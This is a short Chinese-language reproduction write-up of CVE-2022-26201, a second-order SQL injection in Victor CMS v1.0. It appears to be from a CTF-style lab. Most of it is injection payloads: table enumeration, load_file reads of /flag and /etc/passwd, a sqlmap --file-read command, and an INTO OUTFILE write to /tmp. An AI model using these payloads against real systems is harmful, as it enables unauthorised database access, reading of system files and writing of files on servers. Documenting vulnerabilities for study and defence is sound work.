## 1. 漏洞介绍
Victor CMS v1.0 存在二次注入漏洞
## 2. 漏洞分析
[CVE-2022-26201.pdf](https://github.com/truonghuuphuc/CVE/blob/main/CVE-2022-26201.pdf)，文件内容就是下面两张图片。

![CVE-2022-26201_Page1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310051833762.png)

![CVE-2022-26201_Page2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310051834696.png)

## 3. 漏洞复现
**漏洞点测试**

![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310051746746.png)

手动注入示例

```sql
'),(concat((select table_name from information_schema.tables where table_schema='php_cms' limit 0,1)))-- -
```

手动注入没找到 flag 表，尝试直接从根目录读取 flag 

```sql
'),(concat((select load_file('/flag'))))-- -
```

![2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310051829045.png)

也可以用sqlmap跑，但特别慢【时间盲注】

```shell
python sqlmap.py -r post.txt -p cat_title --batch --file-read "/flag"
```

![3.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310051831715.png)

## 4. SQL注入读写文件
SQL命令来读取文件

```
' and 1=2 union all select load_file('/etc/passwd')--+
```

接着尝试在/tmp目录写入文件

```
' and 1=2 union all select 'blablalba_bug_bounty_program' into outfile '/tmp/blablabla'--+
```
